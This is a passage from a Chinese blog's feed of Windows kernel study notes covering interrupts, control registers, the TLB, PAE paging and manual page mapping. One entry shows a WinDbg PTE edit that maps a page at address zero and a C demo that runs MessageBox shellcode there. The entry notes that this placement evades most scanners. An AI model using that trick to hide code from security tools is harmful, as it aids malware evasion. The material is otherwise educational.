    <summary type="html">今天来学习一下Windows驱动开发基础</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="驱动程序开发" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（6）——中断与异常和控制寄存器</title>
    <link href="https://xia0ji233.github.io/2024/11/22/WindowsKernel6/"/>
    <id>https://xia0ji233.github.io/2024/11/22/WindowsKernel6/</id>
    <published>2024-11-22T07:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.494Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下X86中断与异常和控制寄存器</p><span id="more"></span><h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断通常是由<code>CPU</code>外部的输入输出设备（硬件）所触发的，供外部设备通知<code>CPU</code>有事情需要处理，因此又叫中断请求，英文为<code>Interrupt Request</code>。中断请求的目的是希望<code>CPU</code>暂时停止执行当前正在执行的程序，转去执行中断请求所对应的中断处理例程，中断处理程序由 IDT 表决定。</p><p><code>80x86</code> 有两条中断请求线：非屏蔽中断线，<code>NMI</code>，全称<code>NonMaskable Interrupt</code>和可屏蔽中断线，<code>INTR</code>，全称<code>Interrupt Require</code>。</p><h3 id="可屏蔽中断"><a href="#可屏蔽中断" class="headerlink" title="可屏蔽中断"></a>可屏蔽中断</h3><p>CPU 的 EFLAGS 有一个 IF 位，它表示了 CPU 当前是否接受可屏蔽中断请求，下面是 EFLAGS 寄存器的图解</p><img src="/2024/11/22/WindowsKernel6/1.png" class=""><p>IF 是第九位，权值为 0x200，这也就是为什么在用户态我们看到的 EFLAGS 值几乎都是 2xx，因为用户态几乎不允许把该位复位，复位该位需要特权指令 cli 来操作，而重新设置指令需要 sti 来操作。</p><p>IF &#x3D; 1 的时候，可屏蔽中断请求可以被执行，IF &#x3D; 0 的时候，可屏蔽中断会被屏蔽，不会被执行，不可屏蔽中断走的是 CPU 的NMI引脚，而可屏蔽中断走的就是INTR引脚。</p><p>在硬件级，可屏蔽中断是由一块专门的芯片来管理的，通常称为中断控制器。它负责分配中断资源和管理各个中断源发出的中断请求.为了便于标识各个中断请求，中断管理器通常用<code>IRQ</code>，全称为<code>Interrupt Request</code>，后面加上数字来表示不同的中断，例如在键盘设备中，可以看到键盘的请求是一号中断</p><img src="/2024/11/22/WindowsKernel6/2.png" class=""><h3 id="不可屏蔽中断"><a href="#不可屏蔽中断" class="headerlink" title="不可屏蔽中断"></a>不可屏蔽中断</h3><p>不赘述了，就是 CPU 收到就必须立刻执行的事件，诸如CPU掉电，总线校验错误，内存校验错误，看门狗错误等，一旦发生了这些事件，硬件会向 CPU 的 NMI 引脚发送一个中断请求要求 CPU 立刻响应。不过大部分的 NMI 可能都表示着CPU生存周期的终结（出现的故障无法恢复），当然也有一些软件产生的 NMI 中断，可能在执行完事件处理程序之后，会允许 CPU 继续运行。</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常通常是<code>CPU</code>在执行指令时检测到的某些错误，比如除0、访问无效页等。也可以看出，异常是 CPU 主动触发的，是在检测到一些指令不符合某些要求的时候触发的。而中断是由外部设备（中断源）向CPU请求的，是被动的。<code>int n</code> 虽然这个指令是中断（<strong>Interrupt</strong>）的缩写，但是它本质还是 CPU 主动触发了一个异常，就跟除法的时候检测到了被除数为零是差不多的。</p><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>无论是由硬件设备触发的中断请求还是由<code>CPU</code>产生的异常，处理程序都在<code>IDT</code>表。常见的异常处理程序如下表所示：</p><table><thead><tr><th align="center">错误类型</th><th align="center">（IDT表）中断号</th></tr></thead><tbody><tr><td align="center">页错误</td><td align="center">0xE</td></tr><tr><td align="center">段错误</td><td align="center">0xD</td></tr><tr><td align="center">除零错误</td><td align="center">0x0</td></tr><tr><td align="center">双重错误</td><td align="center">0x8</td></tr></tbody></table><h4 id="缺页异常"><a href="#缺页异常" class="headerlink" title="缺页异常"></a>缺页异常</h4><p>这是 CPU 主动触发的比较多的异常，当<code>PDE/PTE</code> 的 <code>P=0</code> 时或当<code>PDE/PTE</code>的属性为只读但程序试图写入的时就会触发。一旦发生缺页异常，<code>CPU</code>会执行<code>IDT</code>表中的<code>0xE</code>中断处理程序，由操作系统来接管。</p><p>在 Windows 操作系统中，大家都听过 pagefile.sys，它占用空间很大并且无时无刻不被写入，以前问过一个很蠢的问题就是，这个文件是否能删？先来了解一下这个文件是干啥的，答：为了节省物理内存。由于程序局部性的原理，一个程序所占用的物理页，很可能只有一小部分的数据会被频繁读写或者执行，大部分数据可能都不会反复被使用，那么对于这样一部分的物理页，操作系统会选择将该物理页保存到外部文件，也就是这个 pagefile.sys，也就是这个物理页不会被挂上去了。但是当再一次需要使用的时候怎么办呢，此时找不到对应的物理页，CPU 报告一个缺页异常，调用 IDT 表的 0xE 中断程序去处理，发现这个虚拟内存事实上是有对应的物理内存，只是现在被交换到外部文件当中，那就重新指定一个物理页，把内容写回重新挂上，向CPU报告“这个虚拟内存已经被正确挂上了物理页，可以访问了”，那么CPU重新执行这条指令之后就不会报错了就接着运行。</p><p>可以说，缺页异常在操作系统中是无时无刻不在发生。就连刚申请的内存页，在不访问之前也是不会挂物理页的（即不实际占用内存），在第一次访问的时候会引发缺页异常，发现这个页是正确的，只是没被挂物理页，那么挂上物理页之后重新执行再返回。</p><h2 id="控制寄存器介绍"><a href="#控制寄存器介绍" class="headerlink" title="控制寄存器介绍"></a>控制寄存器介绍</h2><p>控制寄存器（CR0、CR2、CR3、CR4）中有一些标志和数据域用于控制系统级操作，另外一些标志则专用来支持操作系统和管理程序，其中，CR1作保留目前不使用。</p><h3 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h3><p>CR0寄存器中含有控制处理器操作模式和状态的系统控制标志，可以说它是总开关的集合体。如下图所示：</p><img src="/2024/11/22/WindowsKernel6/3.png" class=""><p>这里解释几个重要的位</p><ul><li><code>PE</code>位是启用保护模式（Protection Enable）标志。若<code>PE = 1</code>是开启保护模式，反之为实地址模式。这个标志仅开启段级保护，而并没有启用分页机制。若要启用分页机制，那么<code>PE</code>和<code>PG</code>标志都要置位。</li><li><code>PG</code>位是启用分页机制。在开启这个标志之前必须已经或者同时开启<code>PE</code>标志。<code>PG = 0</code>且<code>PE = 0</code>，处理器工作在实地址模式下。<code>PG = 0</code>且<code>PE = 1</code>，处理器工作在没有开启分页机制的保护模式下。<code>PG = 1</code>且<code>PE = 0</code>，在<code>PE</code>没有开启的情况下无法开启<code>PG</code>。<code>PG = 1</code>且<code>PE = 1</code>，处理器       工作在开启了分页机制的保护模式下。</li><li><code>WP</code>位对于<code>Intel 80486</code>或以上的<code>CPU</code>，是写保护（Write Proctect）标志。当设置该标志时，处理器会禁止超级用户程序（例如特权级0的程序）向用户级只读页面执行写操作；当<code>CPL &lt; 3</code>的时候，如果<code>WP = 0</code>可以读写任意用户级物理页，只要线性地址有效。如果<code>WP = 1</code>可以读取任意用户级物理页，但对于只读的物理页，则不能写。</li></ul><h3 id="CR1"><a href="#CR1" class="headerlink" title="CR1"></a>CR1</h3><p>保留，暂不使用</p><h3 id="CR2"><a href="#CR2" class="headerlink" title="CR2"></a>CR2</h3><p>当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会将引起异常的线性地址存放在CR2中。</p><h3 id="CR3"><a href="#CR3" class="headerlink" title="CR3"></a>CR3</h3><p>CR3含有存放页目录表页的物理地址，因此CR3也被称为PDBR（Page-Directory Base address Register，页目录基地址寄存器）。因此前面提到的，dirbase 就是 CR3 的值，事实上任务的切换也依赖于 CR3 寄存器。</p><h3 id="CR4"><a href="#CR4" class="headerlink" title="CR4"></a>CR4</h3><p><code>Cr4</code>的结构如下图所示：</p><img src="/2024/11/22/WindowsKernel6/4.png" class=""><p><code>VME</code>用于虚拟8086模式。<code>PAE</code>用于确认是哪个分页，<code>PAE = 1</code>，是<code>2-9-9-12</code>分页，<code>PAE = 0</code>是<code>10-10-12</code>分页。<code>PSE</code>是大页是否开启的总开关，如果置0，就算<code>PDE</code>中设置了大页你也得是普通的页。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364650.html">https://www.cnblogs.com/wingsummer/p/15364650.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_7/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_7&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">今天来学习一下X86中断与异常和控制寄存器</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（5）——TLB</title>
    <link href="https://xia0ji233.github.io/2024/11/11/WindowsKernel5/"/>
    <id>https://xia0ji233.github.io/2024/11/11/WindowsKernel5/</id>
    <published>2024-11-11T14:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.493Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下TLB的一些细节</p><span id="more"></span><h2 id="TLB简介"><a href="#TLB简介" class="headerlink" title="TLB简介"></a>TLB简介</h2><p>TLB（Translation Lookaside Buffer，转换后援缓冲器），是一个硬件单元，它用于保存每个进程虚拟地址到物理地址的映射，这里做的对进程的区分大概是使用 CR3 区分的，这个点看很多文章都没有提到，但是仅仅保存线性地址到物理地址的映射是必然不够的，因为不同的进程的同一线性地址不一定对应相同的物理页，但是猜测大概是这样的。</p><p>TLB 做了指令和数据的区分，ITLB专门存放指令页（可执行页），DTLB专门存放数据页（不可执行）</p><p>而根据大页与小页的区别，又可分为大页 TLB 和小页 TLB。将线性地址右移一定位数（页内偏移的位数，小页12，2-9-9-12大页为 21，10-10-12 大页为 22）</p><p>这里就可以分为四种了。</p><ol><li>第一组：缓存一般页表（4K字节页面）的指令页表缓存（Instruction-TLB）；</li><li>第二组：缓存一般页表（4K字节页面）的数据页表缓存（Data-TLB）；</li><li>第三组：缓存大尺寸页表（2M&#x2F;4M字节页面）的指令页表缓存（Instruction-TLB）；</li><li>第四组：缓存大尺寸页表（2M&#x2F;4M字节页面）的数据页表缓存（Data-TLB）</li></ol><p>TLB 的结构可以视为一张表格</p><table><thead><tr><th>虚拟页帧</th><th>物理页帧</th><th>属性</th><th>命中次数</th></tr></thead><tbody><tr><td>0x1234</td><td>0x1010</td><td>r-x</td><td>5</td></tr><tr><td>0x1111</td><td>0x1000</td><td>r-x</td><td>3</td></tr></tbody></table><p>上表为例，假设是 ITLB，小页，那么这里有两个条目，分别是：</p><ul><li>线性地址 0x1234000 对应了物理地址 0x1010000。</li><li>线性地址 0x111000 对应了物理地址 0x1000000。</li></ul><p>这里的属性不一定只有读写属性，可能还有一系列的其它属性。</p><p>这里有以下注意的点</p><ol><li>不同的CPU，TLB大小不同。</li><li>只要 CR3 发生变化，TLB立即刷新，一核一套TLB。</li><li>G位只对大页 PDE 和 PTE 有效，当 G 位为 1 时，刷新 TLB 将不会刷新 PTE。</li><li>G位为1的页，当TLB写满时，根据命中次数的字段计算访问频率，将最近一段时间内未被访问的条目驱逐。</li></ol><h2 id="TLB探测"><a href="#TLB探测" class="headerlink" title="TLB探测"></a>TLB探测</h2><p>其实很简单，尝试分配两个页，一个写 a，一个写 b，先将 a 的物理页挂到 0 地址，读取；再将 b 的物理页挂到 0 地址，再次读取，如果读取得到的值一样，就证明了缓存是存在的。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364648.html">https://www.cnblogs.com/wingsummer/p/15364648.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_5&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">今天来学习一下TLB的一些细节</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（4）——挂物理页</title>
    <link href="https://xia0ji233.github.io/2024/11/10/WindowsKernel4/"/>
    <id>https://xia0ji233.github.io/2024/11/10/WindowsKernel4/</id>
    <published>2024-11-10T13:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.493Z</updated>
    
    <content type="html"><![CDATA[<p>挂物理页的一些细节</p><span id="more"></span><h2 id="线性地址有效性判断"><a href="#线性地址有效性判断" class="headerlink" title="线性地址有效性判断"></a>线性地址有效性判断</h2><p>之前我们分析过 <code>MmIsValidAddress</code> 函数，在 10-10-12 分页模式下就是去拿到页表的线性地址，然后判断 PTE 和 PDE 的P位是否都有效。一般来说，如果都有效说明进程在这个线性地址这里挂上了物理页。</p><h2 id="零地址挂页"><a href="#零地址挂页" class="headerlink" title="零地址挂页"></a>零地址挂页</h2><p>考虑以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *x=<span class="literal">NULL</span>;</span><br><span class="line">*x=<span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>通常情况下我们会认为这两条语句执行之后必然出错，这就是所谓的空指针错误，但是空指针真的不能写值吗？未必，只是通常情况下不会在上面挂物理页，而对一个线性地址的内存进行读或写操作都会校验这个线性地址是否有效，如果无效则会抛出异常 crash 程序。</p><p>以 10-10-12 分页为例，写出以下的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID addr=VirtualAlloc(<span class="literal">NULL</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">memset</span>(addr,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr=%08x\n&quot;</span>,addr);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="type">int</span> *x=<span class="literal">NULL</span>;</span><br><span class="line">    *x=<span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,*x);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>等待第一次分配输出地址</p><img src="/2024/11/10/WindowsKernel4/1.png" class=""><p>计算 PDI，PTI 的时候不要偷懒 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000000101100000000000000000</span><br><span class="line">0000000000</span><br><span class="line">0</span><br><span class="line">0101100000</span><br><span class="line">0x160</span><br><span class="line">000000000000</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>注意上面的代码中加入了 memset，这是因为线性地址只有第一次读&#x2F;写的时候会挂物理页，如果只申请没有读写则不会挂物理页。</p><img src="/2024/11/10/WindowsKernel4/2.png" class=""><p>我们尝试把这个页挂在零地址上，这里查看一下 PDI 为 0 的物理地址，如上图所示的值为 0x5a1eb000，这个物理地址必然没有被挂上物理页，我们把刚刚那个页的PTE写到线性地址 0 上。</p><p>使用 windbg 命令 <code>!ed 0x5a1eb000 2b13a847</code>。</p><img src="/2024/11/10/WindowsKernel4/3.png" class=""><p>现在 0 地址挂上了物理页，我们再看看能否继续运行。</p><img src="/2024/11/10/WindowsKernel4/4.png" class=""><p>发现没有问题，完美运行通过，而如果此时去读刚刚 addr 分配的线性地址就会发现，值同样也是 0x12345678，而对应的物理页肯定也是这个值，这里对代码稍作修改再次输出。</p><img src="/2024/11/10/WindowsKernel4/5.png" class=""><p>这点也论证了同一个物理页是可以被挂上不同的线性地址，这里展示的是同一个进程不同的线性地址。而不同进程的线性地址同样也能挂同一个物理页，也就是所谓的共享内存（一个进程修改，另一个进程会得到修改的结果）。</p><h2 id="零地址写shellcode"><a href="#零地址写shellcode" class="headerlink" title="零地址写shellcode"></a>零地址写shellcode</h2><p>Windows 的 shellcode，通常情况下，shellcode 藏在 0 线性地址是比较有效的，因为大部分扫描器通常不会去动 0 这一片的地址，而挂页的时候，是否可执行是通过 PTE 决定的。也就是说，同样的一个物理页，你可以以只读形式挂在 0x400000 这样的一个线性地址，同时还可以以读写的形式挂在 0 地址，这是可行的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*funcptr)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID addr=VirtualAlloc(<span class="literal">NULL</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr=%08x\n&quot;</span>,addr);</span><br><span class="line">    BYTE shellcode[]=&#123;</span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,xxx</span></span><br><span class="line">        <span class="number">0xFF</span>,<span class="number">0xD0</span>, <span class="comment">//call eax</span></span><br><span class="line">        <span class="number">0xC3</span>, <span class="comment">//ret</span></span><br><span class="line">    &#125;;</span><br><span class="line">    *(DWORD *)(&amp;shellcode[<span class="number">9</span>])=(DWORD)MessageBox;</span><br><span class="line">    <span class="built_in">memcpy</span>(addr,shellcode,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    funcptr func=<span class="number">0</span>;</span><br><span class="line">    func();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时这个shellcdoe也是比较简单的，仅仅是弹框而已。</p><img src="/2024/11/10/WindowsKernel4/6.png" class=""><p>这里因为用的是 10-10-12 分页，所以说 PTE 没有哪个位表示页是否可以执行，也就是说所有的页都可以执行，在 2-9-9-12 分页我们只需要把最高位设置为 0 即可。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364648.html">https://www.cnblogs.com/wingsummer/p/15364648.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_5&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">挂物理页的细节</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（3）——PAE分页（2-9-9-12分页）</title>
    <link href="https://xia0ji233.github.io/2024/11/09/WindowsKernel3/"/>
    <id>https://xia0ji233.github.io/2024/11/09/WindowsKernel3/</id>
    <published>2024-11-09T09:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.492Z</updated>
    
    <content type="html"><![CDATA[<p>来学一下2-9-9-12分页，也叫PAE分页</p><span id="more"></span><h2 id="为什么要有2-9-9-12分页"><a href="#为什么要有2-9-9-12分页" class="headerlink" title="为什么要有2-9-9-12分页"></a>为什么要有2-9-9-12分页</h2><p>这一定一定是最会疑惑的一个问题，为什么要多拆一个 2 出来呢？回答：扩展物理内存。</p><p>我们都知道，32位的系统最大只能装 4GB 的内存，多了它用不上，然而这个说法比较片面，实则它可以装更多的内存，在 10-10-12 分页的模式中，我们知道，物理地址就是 32 位的，而物理地址位宽决定了物理内存最大的限度。</p><p>那么 2-9-9-12 分页事实上就做到了这一点，它将物理地址扩展到了 64 位的模式，并赋予一些位特殊的意义。既然物理地址变成了 64 位，PDE 和 PTE 自然也变成了 64 位，那么原来一个页就装不下 1024 个 PDE 或者 PTE 了，而只能装 512 个，这就是中间两个 9 的来源。而我们只扩展了物理地址，没有扩展虚拟地址，因此虚拟内存（单个进程持有的线性地址）最大还是只有 4GB。 所以前面再多个 2 去满足 32 位。</p><h2 id="2-9-9-12分页简介"><a href="#2-9-9-12分页简介" class="headerlink" title="2-9-9-12分页简介"></a>2-9-9-12分页简介</h2><p>看完上一节之后大概能对 2-9-9-12 分页有个结构了，如下图所示：</p><img src="/2024/11/09/WindowsKernel3/1.png" class=""><p>多了一层名为<strong>页目录指针表（PDPTE）</strong>的东西，同样也是 64 位的大小，它的结构如下图所示：</p><img src="/2024/11/09/WindowsKernel3/2.png" class=""><p>它只使用了高四个字节的四位，但是为了对齐它填充到了 8 个字节，因此物理页地址被扩展到了 36 位，物理可用的内存达到了 64GB。</p><p>如果一个进程挂满物理页的情况下，在 10-10-12 分页模式下只能运行一个，但是在 2-9-9-12 分页模式下可以运行 16 个。</p><p>剩下的 PDE 和 PTE 扩展结构同理。</p><p>再有一点需要说的是，我们的页属性只有读和写两种，但是在三环的内存中，似乎还有<strong>可执行</strong>这个位，那么这个位在哪呢，实际上它将这个位填到了高位，也就是说 PTE，PDE，PDPTE这些大致结构应该如下图所示：</p><img src="/2024/11/09/WindowsKernel3/3.png" class=""><p>这是硬件层面上做的保护，一旦尝试执行的物理页中对应的 PTE 和 PDE 和 PDPTE 被置为 1，说明该页的数据不可以被执行，CPU尝试执行的时候会直接报出异常。</p><h2 id="2-9-9-12分页实践"><a href="#2-9-9-12分页实践" class="headerlink" title="2-9-9-12分页实践"></a>2-9-9-12分页实践</h2><p>同样拿记事本和 CE 来做实验。</p><img src="/2024/11/09/WindowsKernel3/4.png" class=""><p>得到线性地址 <code>0x00264EE8</code>，拆分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000001001100100111011101000</span><br><span class="line">按2-9-9-12拆开</span><br><span class="line">00</span><br><span class="line">0x0</span><br><span class="line">000000001</span><br><span class="line">0x1</span><br><span class="line">001100100</span><br><span class="line">0x64</span><br><span class="line">111011101000</span><br><span class="line">0xEE8</span><br></pre></td></tr></table></figure><p>一样的流程找到对应的物理页</p><img src="/2024/11/09/WindowsKernel3/5.png" class=""><p>于此同时可以发现，在PTE条目中，最高位被置为 1，表示该数据是不执行的。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364648.html">https://www.cnblogs.com/wingsummer/p/15364648.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_5&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;来学一下2-9-9-12分页，也叫PAE分页&lt;/p&gt;</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（2）——页属性实验</title>
    <link href="https://xia0ji233.github.io/2024/11/07/WindowsKernel2/"/>
    <id>https://xia0ji233.github.io/2024/11/07/WindowsKernel2/</id>
    <published>2024-11-07T14:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.492Z</updated>
    
